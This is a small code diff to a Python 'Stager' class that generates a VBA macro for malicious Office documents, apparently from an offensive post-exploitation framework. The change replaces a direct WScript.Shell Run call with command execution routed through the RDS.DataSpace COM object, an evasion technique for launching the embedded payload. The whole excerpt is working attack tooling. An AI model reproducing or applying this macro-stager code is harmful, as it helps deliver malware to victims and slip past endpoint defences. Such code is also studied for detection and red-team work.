@@ -190,8 +190,8 @@ class Stager(object):
                 macro +="\tNext\n"
                  
             macro += payload
-            macro += "\tSet asd = CreateObject(\"WScript.Shell\")\n"
-            macro += "\tasd.Run("+Str+")\n"
+            macro += "\tSet comApp = CreateObject(\"RDS.DataSpace\")\n"
+            macro += "\tcomApp.CreateObject(\"Wscript.Shell\", \"\").exec ("+Str+")\n"
             macro += "End Function\n"
 
             return macro
